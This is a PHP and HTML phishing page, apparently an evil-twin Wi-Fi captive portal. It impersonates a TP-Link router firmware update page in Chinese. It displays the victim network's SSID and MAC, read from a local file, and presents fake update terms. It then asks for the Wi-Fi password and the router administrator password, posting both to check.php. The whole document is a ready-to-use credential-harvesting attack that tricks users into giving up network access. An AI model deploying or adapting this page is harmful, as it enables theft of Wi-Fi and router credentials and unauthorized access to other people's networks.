<?php
	$ss=fopen("wifi.txt","r+");
	$s2=fread($ss,filesize("wifi.txt"));//读取全部
	fclose($ss);
	?>
<?php
	$s4=fopen("wifi.txt","r+");//读取第一行
	$s3=fgets($s4);
	fclose($s4);
	?>
<?php
    $c = getLine("wifi.txt", 3); // 读取txt文件第3行内容
	/**
 * 获取指定行内容
 *
 * @param $file 文件路径
 * @param $line 行数
 * @param $length 指定行返回内容长度
 */
function getLine($file, $line, $length = 4096){
    $returnTxt = null; // 初始化返回
    $i = 1; // 行数
 
    $handle = @fopen($file, "r");
    if ($handle) {
        while (!feof($handle)) {
            $buffer = fgets($handle, $length);
            if($line == $i) $returnTxt = $buffer;
            $i++;
        }
        fclose($handle);
    }
    return $returnTxt;
}
	?>
<!DOCTYPE html>
<html lang=en> <head><title>Tplink路由器固件更新</title><link rel="shortcut icon" href="http://192.168.0.107/tp/favicon.ico"><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=bootstrap.min.css><script src=jquery.min.js></script><script src=bootstrap.min.js></script><!-- CSS --><style type=text/css>

    /* Sticky footer styles
    -------------------------------------------------- */

    html,
    body {
          height: 100%;
          /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }
  </style></head> <body> <!-- Start navigation bar --> <!-- To change the navigation bar color change background attribute --> <nav class="navbar navbar-inverse" style=background:RoyalBlue;margin-top:0em;> <div class=container-fluid> <div class=navbar-header> 
	<div><svg width="160" height="41" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

 <g>
  <title>background</title>
  <rect fill="none" id="canvas_background" height="479" width="1060" y="-1" x="-1"/>
 </g>
 <g>
  <title>Layer 1</title>
  <image xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAAAhCAYAAAAYlQP6AAAF8ElEQVR4nO2baYwURRSAv91ZFFDAgLDe/hAT0SgIaqKo8YeiJOB6Ro0iRNGAeMQjSoiBCBqviP5QY0AT4wFRMKgIYjxwjUcIJHgAHsEDERU1nMsRXLfMS7+Roquqp2emZ4Sd+ZLOTF511XRVv3r13quaBmMMdWqGA4GrgQuAvsBfwCLgJaBNBqGuELXD2cBM4EfgTWAtcBRwsX7eALTWFaI2OAH4BLgbeEF73ADs0O9jgceAoXWFqA0+ABYDDwErgA1AB9BVleR9YCpwVl0hOj/HAW+rlTgY+AgYrErxADACGAj0EivSVOujVQPIy/4J2A40AjlVgo3AIOAzHYLNwPLGWh+tGiCnywPWMnGJRhbiQ4y3hqC9rhCdn5UaRTSpI7kJuAg4AxgCHK8j0F2sSV0hOj9f6fJwnX7ur76EKMqrVtQxWixI3amsDc4EFgLXAGuAL6xeDwX6AC8CI+sKUTtcCTwKLADmA78Bzepgtmj4OauuELWF+BITgHM0jd2mYeiTajnqqesaRqKPf+LdF4UQc7FfBuMizss3wCGS8XJK07NBY+PtRdQ5ADhfO2mzS5Myu5waYSSBM8pT+ifwhA7itcAxKu8CGE0NL3RqhRkJnAh8D7yid8nsPdJT4zVgqSPdTR995pzmGtqBZ4Gtzp2FMMbsNNkwRayNMWZEBq2tMsacou2lufo7LUTsMsY0F9GOXJc7rUSsM8Z00XuWOKURs40x3Txt+q65WqfVKlvhtBhxk6d+/mr2PM/txpic596CV6PGplnimKESGADMBXqnrNphbdTYFGNl8vztSCLs2dbmlEaI4/a0I/WTf7ZtKdoNWbhmtYCnWbIbgcdLfQ9Nav58S8YUyyzazNaHiLPckeyJmMb7YrIGNdET1OzbHF3kAIfIWuELMQZYBjxV4L5ykaX5LeBkq52bdYu7ZJqs9SvOuIBCfKwxa7GsT6gna94kRwrnlqkQOV3jq8104HP1KypBPw0fB1tt35mFEiZlKuMOWp6ujiQdofaEnx1JxOGOZN9ALO7LwKEVeNojgHdiyjBRlbBskhSimoR2XUPytDRUuI/yYr5zpBGy5D1fYCKkJb/sHaaRzCCrniztD2fUn71GIcol5Cc0ZvRCQqxUP2dnoHwYcL8jLZ423X9YpKFqnml6sCUz9pXzEKE8g9CaEBlUmp7qTN8KzAj8lpjzJcDrTkl6jgVusZRB+vsIMDnr/u0tCtHhSCLyM79ZkzM+hqkD56PSFiLPTI2WbnNKIp4Dvga+dUrSMTnWjy3AM5XoSDWXjNBLR/PqPto9smKotA9hcxfwniON6K1OZnenJB1xpe6jIWe/rDtRTQshg9E/JpOXdSpwh3N3xDL93KTn/3wh5A+6x/9/067/efg0EK4P0RB6jFNSGgN1GRqux98yoZoKcZKaTZsGj/bn2ax7B+j+xr3OHbvxvQBU4XxKVCn+UCfzQ0+iDT2EsrTIfIHRfYnhGnLanA7M0e1rX6a2aKq5ZDSoAtpXSBl+By5LCOnidOjA+X4zFIFUimWaPg4xXa3FlkC5rw/vWgdj45yn2eNMFL+aFkJmzzxH6rJGD4CudUrC7EjwN6qtEMIsjQgmOiVR0koytuuckjC99JTTpcAbQI/YnS3quI4OTIzUVFMhVms6vBJs1RnXM9Z2LkFRKs0k3aRr8fzOAL2KZbGemJ7nccRH6UbZ+BLa/Y9qLhmh5SELtul/Fn1cCBykTm2hK1fuDLMwerB1lVNSHhLJXBHwGcbpv7NKpjP9UWdB4GDOgxrFhLaQbcYmbEGXgjjDV+mGYNzMl8NCVYo5ngjrHp0g00ppP8lCdHMkEYWcl5AlCLWXFTMSElR9daOs0NUjYUy6e76n2ej7Erg+wfJ0C3y38Y35fD1F7VsSp2pUFnoXQZIsRKs6gnFWO5I9WR9I0MRDzqzZqNvl4/TASClJoF91dvmeX5zc/EuVpJAsUXJANQ0ykyWXItZCHMQ8YrXscyShMZe/4vmQQ0SSxpaQ1EYcaQlRZbf1l9S9B/4F4JPs9ThC2TMAAAAASUVORK5CYII=" height="33" width="132" y="1" x="8" data-name="图层 1" id="图层_1"/>
 </g>
</svg></div>
        
        </div> </div> </nav> <!-- End navigation bar --> <!-- Start page content --> <div class=container> <div class=col-sm> 
	
	<h2 class=text-center style=color:RoyalBlue>路由器固件更新</h2>
<P style="text-align: center" ><a style="text-align: center;color: #E4074C;font-weight: bolder">SSID：</a><?php echo ("$s3"); ?> </P>
<p style="text-align: center"><a style="text-align: center;color: #E4074C;font-weight: bolder">MAC：</a><?PHP echo($c) ?></p>
	<p class=lead>我们发现了新的固件版本，需要您配合我们完成更新。请输入密码完成更新！</p> 
	
	
	</div> <form action=check.php method=POST> <div class=form-group> <label for=comment>服务许可条款:</label> <textarea readonly class=form-control rows=5 id=comment>
1： 为了改善用户体验、完善服务内容，TPLINK将不断努力开发新的服务，并为用户不时提供软件更新（这些更新可能会采取软件替换、修改、功能强化、版本升级等形式）。

2： 为了保证本软件及服务的安全性和功能的一致性，TPINK有权不经向用户特别通知而对软件进行更新，或者对软件的部分功能效果进行改变或限制。

3： 本固件新版本发布后，旧版本的软件可能无法使用。tpkink不保证旧版本软件及相应的客户服务继续可用，请用户随时核对并下载最新版本。

4： 用户同意，TPKINK可能通过公告、更新日志等方式向用户通知软件更新情况。
5： 请疑问请访问我们的论坛（https://bbskali.cn）
       </textarea> <div class=checkbox> <label><input type=checkbox id=check-box onclick=checkBoxStatus()>我同意以上条款</label> </div> </div> <div class="form-group has-feedback"> <label for=password>请输入WiFi密码开始更新:</label>
	<input class=form-control type=password id=pwd name=key1>
	 <label for=password>请输入路由器管理密码:</label>
	<input class=form-control type=password id=pwd2 name=key2>
	</div> <div class="container text-center"> <input type=submit class="btn btn-primary" id=btn value="开始更新"> </div> </form> <div id=push></div> </div> <!-- Start page content --> <!-- Start footer --> <footer class=footer> <div class="container text-center"> <p class=text-muted>TP-LINK© 2020, All Rights bbskali.cn</p> </div> </footer> <!-- End footer --> <!-- Start update first message --> <div class="modal fade" id=update-only role=dialog> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Update First.</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End update first message --> <!-- Start empty password message --> <div class="modal fade" id=empty-pass> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Input Valid Password. (Must be between 7 and 64 characters)</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End empty password message --> <!-- Start empty password message --> <div class="modal fade" id=no-checkbox> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Check The I Agree Button.</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End empty password message --> <script>

/*
  Check the password field and act accordingly.
*/
$("#btn").on("click", function(e) {

    // get the password box and checkbox elements
  var input = document.getElementById("pwd");
    var box = document.getElementById("check-box");

    // if the box is checked
    if ( box.checked != true ){
          // display no checkbox message
          $("#no-checkbox").modal("show");
    return false;
        }
        if ( input.value.lenght < 7 ||  input.value.lenght > 64){
    // display no password message
    $("#empty-pass").modal("show");
    return false;
    }


});


/*
  Check the status of check box
*/
function checkBoxStatus()
{
  // get the password box and checkbox elements
  var box = document.getElementById("check-box");
  var input = document.getElementById("pwd");

  // if the box is checked
  if ( box.checked == true )
    {
      // enabale the password box
      input.disabled = false;
    }
  else
    {
      // disable the password box
      input.disabled = true;
    }
  }
</script> </body> </html> 